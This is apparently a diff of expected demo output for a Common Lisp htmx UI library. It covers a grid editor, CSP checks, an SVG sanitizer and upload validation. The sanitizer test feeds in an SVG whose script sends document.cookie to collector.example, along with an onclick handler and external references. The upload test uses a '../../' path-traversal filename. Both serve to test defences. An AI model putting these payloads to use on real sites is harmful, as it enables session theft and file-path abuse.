@@ -1,11 +1,6 @@
 WARNING: System definition file #P"~/.cl-repository-client/trivial-garbage-0.21/trivial-garbage.asd" contains definition for system "trivial-garbage-tests". Please only define "trivial-garbage" and secondary systems with a name starting with "trivial-garbage/" (e.g. "trivial-garbage/test") in that file.
 ;;; Computing Hangul syllable names
-WARNING:
-   cl-repo: encoding-protocol 0.2.0 stays loaded from ~/.cl-repository-client/encoding-protocol-0.2.0/encoding-protocol.asd; the registry also has 0.3.0 at ~/.local/share/cl-repository/systems/encoding-protocol/0.3.0/encoding-protocol.asd, which this image will not load. Code that needs 0.3.0 runs against the older copy: upgrade the client or load the project in a fresh image.
-WARNING:
-   cl-repo: http-protocol 0.4.0 stays loaded from ~/.cl-repository-client/http-protocol-0.4.0/http-protocol.asd; the registry also has 0.4.1 at ~/.local/share/cl-repository/systems/http-protocol/0.4.1/http-protocol.asd, which this image will not load. Code that needs 0.4.1 runs against the older copy: upgrade the client or load the project in a fresh image.
-WARNING:
-   cl-repo: http-backend-async 0.2.22 stays loaded from ~/.cl-repository-client/http-backend-async-0.2.22/http-backend-async.asd; the registry also has 0.2.23 at ~/.local/share/cl-repository/systems/http-backend-async/0.2.23/http-backend-async.asd, which this image will not load. Code that needs 0.2.23 runs against the older copy: upgrade the client or load the project in a fresh image.
+; cl-repo: dependencies from cl-repo.lock (74 packages)
 This is SBCL 2.6.9, an implementation of ANSI Common Lisp.
 More information about SBCL is available at <http://www.sbcl.org/>.
 
@@ -18,14 +13,14 @@ WARNING: redefining CONSUME-ITEM (#<BUILT-IN-CLASS COMMON-LISP:SYMBOL> #<SB-PCL:
 ;;; Computing Hangul syllable namesWARNING:
    redefining LOAD-PROXY-SYSTEM-PLATFORM (#<STANDARD-CLASS HTTP-PROTOCOL:HTTP-PROXY-CONFIG>) in DEFMETHOD
 WARNING:
-   cl+ssl was loaded before cl-stack-ssl; it keeps the OpenSSL it found, not ~/.local/share/cl-repository/systems/cl-stack-ssl/3.5.9.3/native/libssl.3.dylib
+   cl+ssl was loaded before cl-stack-ssl; it keeps the OpenSSL it found, not ~/.local/share/cl-repository/systems/cl-stack-ssl/3.5.9.4/native/libssl.3.dylib
 WARNING: redefining IRONCLAD:BLOCK-LENGTH in DEFGENERIC
 
-; compiling file "<demo>/src/demo.lisp" (written 22 NOV 2026 06:10:40 PM):
+; compiling file "<demo>/src/demo.lisp" (written 24 NOV 2026 01:48:59 AM):
 
-; wrote ~/.cache/common-lisp/sbcl-2.6.9-macosx-arm64<demo>/src/demo-tmp5GEXGEG5.fasl
-; compilation finished in 0:00:00.024
-canvas-protocol 0.1.1, theme :ENGELS, chart backend CANVAS-BACKEND-SVG:SVG-BACKEND, htmx 2.0.11 + sse 2.2.4
+; wrote ~/.cache/common-lisp/cl-repo/sbcl-2.6.9-macosx-arm64<demo>/src/demo-tmp5GEXGEG5.fasl
+; compilation finished in 0:00:00.166
+canvas-protocol 0.2.0, theme :ENGELS, chart backend CANVAS-BACKEND-SVG:SVG-BACKEND, htmx 2.0.11 + sse 2.2.4
 token: 32 hex chars (printed as <token>)
 
 ========================================================================
@@ -123,3 +118,192 @@ after:  <div id="chart"><figure data-chart="scatter"><svg id="chart-
 bar before: T, scatter after: T, color="#D55E00" after: T
 
 server stopped
+
+========================================================================
+== 5. A keyboard-driven grid editor: key chords, hx-sync, hx-swap-oob (0.2.0)
+========================================================================
+key-chord spells a binding the way canvas-keys.js reports the key press:
+  "arrowup"              → "ArrowUp"
+  "ctrl+Z"               → "Ctrl+z"
+  "Shift+a"              → "Shift+a"
+  "control+alt+delete"   → "Ctrl+Alt+Delete"
+  "space"                → "Space"
+  "Plus"                 → "Plus"
+  "Shift+/"              → refused: Canvas error: invalid key chord "Shift+/": with Shift the browser reports the shifted character
+  "Ctrl++"               → refused: Canvas error: invalid key chord "Ctrl++" (want modifiers and one key, joined with +)
+  "Hyper+x"              → refused: Canvas error: invalid key chord "Hyper+x": unknown or repeated modifier "Hyper"
+
+the editor as served: the <section> holds the bindings, the queue and the target
+  <section id="editor" aria-label="Grid editor" hx-post="/canvas/HARNESS-DEMOS-CANVAS::GRID-KEY" hx-target="#grid" hx-swap="outerHTML" hx-trigger="canvas:key" hx-sync="this:queue all" data-canvas-keys="ArrowUp ArrowDown ArrowLeft ArrowRight Backspace a b c d e f g h i j k l m n o p q r s t u v w x y z"><table id="grid" role="grid" aria-label="4 by 4 cells"><tbody><tr><td aria-selected="true"><mark>·</mark></td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr></tbody></table><p id="status" role="status">Row 1, column 1 · 0 of 16 cells set</p><ol id="log" aria-label="Key log"></ol></section>
+csp-violations of the editor tree: NIL
+(page body :keys t) loads canvas-keys.js after htmx and the SSE extension:
+  <script src="/canvas-assets/htmx.min.js"></script>
+  <script src="/canvas-assets/htmx-ext-sse.min.js"></script>
+  <script src="/canvas-assets/canvas-keys.js"></script>
+GET the asset canvas-keys.js → 200 text/javascript; charset=utf-8, 3628 bytes, from 'self'
+GET grid-editor as a full page (rpc-backend-htmx's page): canvas-keys.js in it: NIL (no :keys option yet, rpc-backend-htmx#6)
+
+three key presses, as htmx sends them after canvas-keys.js fires canvas:key on #editor:
+POST GRID-KEY key=ArrowRight (HX-Request: true, HX-Trigger: editor, HX-Target: grid) → 200
+  <table id="grid" role="grid" aria-label="4 by 4 cells"><tbody><tr><td>·</td><td aria-selected="true"><mark>·</mark></td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr></tbody></table>
+  <p id="status" role="status" hx-swap-oob="true">Row 1, column 2 · 0 of 16 cells set · last key ArrowRight</p>
+  <ol hx-swap-oob="beforeend:#log"><li>ArrowRight → row 1, column 2</li></ol>
+POST GRID-KEY key=ArrowDown (HX-Request: true, HX-Trigger: editor, HX-Target: grid) → 200
+  <table id="grid" role="grid" aria-label="4 by 4 cells"><tbody><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td aria-selected="true"><mark>·</mark></td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr></tbody></table>
+  <p id="status" role="status" hx-swap-oob="true">Row 2, column 2 · 0 of 16 cells set · last key ArrowDown</p>
+  <ol hx-swap-oob="beforeend:#log"><li>ArrowDown → row 2, column 2</li></ol>
+POST GRID-KEY key=k (HX-Request: true, HX-Trigger: editor, HX-Target: grid) → 200
+  <table id="grid" role="grid" aria-label="4 by 4 cells"><tbody><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td aria-selected="true"><mark>K</mark></td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr><tr><td>·</td><td>·</td><td>·</td><td>·</td></tr></tbody></table>
+  <p id="status" role="status" hx-swap-oob="true">Row 2, column 2 · 1 of 16 cells set · last key k</p>
+  <ol hx-swap-oob="beforeend:#log"><li>k → row 2, column 2</li></ol>
+an unbound chord sent by hand: POST GRID-KEY key=F5 → 422
+  <p role="alert">key must be one of: ArrowUp, ArrowDown, ArrowLeft, ArrowRight, Backspace, a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z</p>
+
+a [filter] trigger is refused:
+  (hx-post … :trigger "keydown[key=='ArrowUp'] from:body") → CANVAS-CSP-ERROR
+    Canvas error: CSP: eval-trigger attribute hx-trigger
+    violations ((:KIND :EVAL-TRIGGER :ELEMENT NIL :ATTRIBUTE "hx-trigger"))
+  csp-violations of a raw <div hx-trigger="keydown[key=='ArrowUp']">: ((:KIND :EVAL-TRIGGER :ELEMENT "div" :ATTRIBUTE "hx-trigger"))
+  why: htmx runs an event filter as JavaScript (the Function constructor), which needs 'unsafe-eval'.
+  The CSP has none: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'
+  and every canvas page sets allowEval false, under which htmx 2.0.11 lets a filter match every event:
+    <meta name="htmx-config" content="{&quot;allowEval&quot;:false,&quot;allowScriptTags&quot;:false,&quot;historyCacheSize&quot;:0,&quot;includeIndicatorStyles&quot;:false,&quot;refreshOnHistoryMiss&quot;:true,&quot;selfRequestsOnly&quot;:true}">
+  canvas-keys.js matches chords from 'self' and evaluates nothing.
+
+========================================================================
+== 6. Engine-generated SVG through svg-fragment's allowlist (0.2.0)
+========================================================================
+the engine's output (2068 chars):
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- generated by a layout engine -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="400" height="100" viewBox="0 0 400 100" preserveAspectRatio="xMidYMid meet">
+  <title>Pipeline</title>
+  <style>.stage text { font: 14px sans-serif }</style>
+  <metadata>layout engine output</metadata>
+  <defs>
+    <linearGradient id="stage-fill" x1="0" y1="0" x2="0" y2="1" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#ffffff"/><stop offset="1" stop-color="#d9d9d9"/></linearGradient>
+    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+    <symbol id="stage-box" viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="url(#stage-fill)" stroke="currentColor"/></symbol>
+  </defs>
+  <g id="stages" class="stage" transform="translate(20,30)">
+    <g id="stage-1" transform="translate(0,0)"><use href="#stage-box" width="80" height="40"/><text x="40" y="25" text-anchor="middle" fill="currentColor">parse</text></g>
+    <g id="stage-2" transform="translate(120,0)" onclick="steal()"><use href="#stage-box" width="80" height="40"/><text x="40" y="25" text-anchor="middle" fill="currentColor">plan</text></g>
+    <g id="stage-3" transform="translate(240,0)"><use xlink:href="#stage-box" width="80" height="40"/><text x="40" y="25" text-anchor="middle" fill="currentColor">emit</text></g>
+  </g>
+  <g id="edges" fill="none" stroke="currentColor">
+    <path d="M100,50 H138" marker-end="url(#arrow)"/>
+    <path d="M220,50 H258" marker-end="url(#arrow)"/>
+  </g>
+  <script>fetch('https://collector.example/?c=' + document.cookie)</script>
+  <foreignObject x="0" y="0" width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">hi</div></foreignObject>
+  <use href="https://cdn.example/sprites.svg#logo" x="370" y="0"/>
+  <rect id="badge" x="370" y="80" width="20" height="10" fill="url(https://cdn.example/paint.svg#p)" hx-get="/admin"/>
+</svg>
+svg-fragment signals UNSAFE-SVG (a CANVAS-CSP-ERROR) with 6 violations, in document order:
+  (:KIND :EVENT-HANDLER :ELEMENT "g" :ATTRIBUTE "onclick")
+  (:KIND :INLINE-SCRIPT :ELEMENT "script" :ATTRIBUTE NIL)
+  (:KIND :FOREIGN-OBJECT :ELEMENT "foreignObject" :ATTRIBUTE NIL)
+  (:KIND :EXTERNAL-HREF :ELEMENT "use" :ATTRIBUTE "href")
+  (:KIND :CSS-URL :ELEMENT "rect" :ATTRIBUTE "fill")
+  (:KIND :HTMX-ATTRIBUTE :ELEMENT "rect" :ATTRIBUTE "hx-get")
+restart CANVAS-PROTOCOL:STRIP-VIOLATIONS offered: T → invoked
+
+the cleaned tree (to-html, 1550 chars):
+<svg width="400" height="100" viewBox="0 0 400 100" preserveAspectRatio="xMidYMid meet">
+  <title>Pipeline</title>
+  
+  
+  <defs>
+    <linearGradient id="stage-fill" x1="0" y1="0" x2="0" y2="1" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#ffffff"></stop><stop offset="1" stop-color="#d9d9d9"></stop></linearGradient>
+    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"></path></marker>
+    <symbol id="stage-box" viewBox="0 0 80 40"><rect width="80" height="40" rx="6" fill="url(#stage-fill)" stroke="currentColor"></rect></symbol>
+  </defs>
+  <g id="stages" class="stage" transform="translate(20,30)">
+    <g id="stage-1" transform="translate(0,0)"><use href="#stage-box" width="80" height="40"></use><text x="40" y="25" text-anchor="middle" fill="currentColor">parse</text></g>
+    <g id="stage-2" transform="translate(120,0)"><use href="#stage-box" width="80" height="40"></use><text x="40" y="25" text-anchor="middle" fill="currentColor">plan</text></g>
+    <g id="stage-3" transform="translate(240,0)"><use href="#stage-box" width="80" height="40"></use><text x="40" y="25" text-anchor="middle" fill="currentColor">emit</text></g>
+  </g>
+  <g id="edges" fill="none" stroke="currentColor">
+    <path d="M100,50 H138" marker-end="url(#arrow)"></path>
+    <path d="M220,50 H258" marker-end="url(#arrow)"></path>
+  </g>
+  
+  
+  <use x="370" y="0"></use>
+  <rect id="badge" x="370" y="80" width="20" height="10"></rect>
+</svg>
+kept:
+  id="stage-fill"                1
+  id="arrow"                     1
+  id="stage-box"                 1
+  id="stages"                    1
+  id="stage-2"                   1
+  id="badge"                     1
+  viewBox=                       3
+  preserveAspectRatio=           1
+  <linearGradient                1
+  gradientUnits=                 1
+  refX=                          1
+  markerWidth=                   1
+  <use href="#stage-box"         3
+  fill="url(#stage-fill)"        1
+  transform="translate(120,0)"   1
+gone:
+  <style                         0
+  <metadata                      0
+  <script                        0
+  <foreignObject                 0
+  onclick                        0
+  hx-get                         0
+  https:                         0
+  xlink                          0
+  version=                       0
+  <!--                           0
+csp-violations of the cleaned tree: NIL; neutralize leaves it unchanged: T; svg-fragment of its own output gives the same text: T
+csp-violations of the final page (page + the stripped diagram): NIL
+freeze 'diagram → wrote diagram.html: 19791 chars, deterministic: T
+  <script        0
+   onclick=      0
+  <foreignObject 0
+  https:         0
+  http:          0
+  hx-get=        0
+  url(#          3
+  viewBox=       3
+  <style         1
+  (the one <style> is the page stylesheet in <head>)
+
+========================================================================
+== 7. Uploads: file-input, a multipart form, coerce-param :file (0.2.0)
+========================================================================
+the form (a file input inside → enctype="multipart/form-data", which htmx sends as FormData):
+  <form id="upload" hx-post="/canvas/HARNESS-DEMOS-CANVAS::UPLOAD-IMAGES" hx-target="#upload" hx-swap="outerHTML" enctype="multipart/form-data"><label>Images (PNG or SVG, at most 2 KiB each)<input type="file" name="images" accept="image/png,.svg" multiple="" required=""></label><button type="submit">Upload</button></form>
+three parts, parsed by mime-protocol from a browser-shaped body (the input's image/png,.svg, max-size 2048):
+  name "images" filename "../../chart.png" image/png, 70 bytes
+  name "images" filename "photos/holiday.png" image/png, 6070 bytes
+  name "images" filename "spinner.gif" image/gif, 42 bytes
+../../chart.png → CANVAS-PROTOCOL:UPLOADED-FILE
+  filename "chart.png" (the last path segment), media type "image/png", size 70, octets (SIMPLE-ARRAY (UNSIGNED-BYTE 8) (70)), path NIL
+photos/holiday.png →
+  signals CANVAS-UPLOAD-TOO-LARGE: images must be at most 2048 bytes
+    expected :MAX-SIZE, detail 2048, size 6070
+    restarts: use-value use-default
+  use-default → :NO-IMAGE
+spinner.gif →
+  signals CANVAS-COERCION-ERROR: images must be a file of type: image/png, .svg
+    expected :ACCEPT, detail ("image/png" ".svg")
+    restarts: use-value use-default
+    the error fragment next to the input: <small id="images-error" role="alert">images must be a file of type: image/png, .svg</small>
+  use-value :skipped → :SKIPPED
+the form's handler, UPLOAD-IMAGES (:multiple t, the first failure wins; coerce-form takes use-default):
+  all three parts →
+  <form id="upload" hx-post="/canvas/HARNESS-DEMOS-CANVAS::UPLOAD-IMAGES" hx-target="#upload" hx-swap="outerHTML" enctype="multipart/form-data"><label>Images (PNG or SVG, at most 2 KiB each)<input type="file" name="images" accept="image/png,.svg" multiple="" required="" aria-invalid="true" aria-describedby="images-error"><small id="images-error" role="alert">images must be at most 2048 bytes</small></label><button type="submit">Upload</button></form>
+  chart.png only  →
+  <ul id="upload"><li>chart.png: image/png, 70 bytes</li></ul>
+the same three files POSTed through the app as a browser sends them (6587 bytes) → 400
+  <p role="alert">htmx error 400: Invalid UTF-8 in multipart body</p>
+  rpc-backend-htmx 0.1.0's codec reads every multipart part as UTF-8 text, so a binary file never reaches
+  the handler; the parts above come straight from mime-protocol. End to end is rpc-backend-htmx#5.
+
+self-check (0.2.0): keys-bound T, queue-all T, editor-csp-clean T, keys-script T, oob-panels T, cell-set T, unbound-422 T, filter-refused T, unsafe-svg T, ids-camel-kept T, stripped T, round-trip T, page-csp-clean T, freeze-deterministic T, multipart-enctype T, upload-ok T, too-large T, wrong-type T
+all 18 true: T
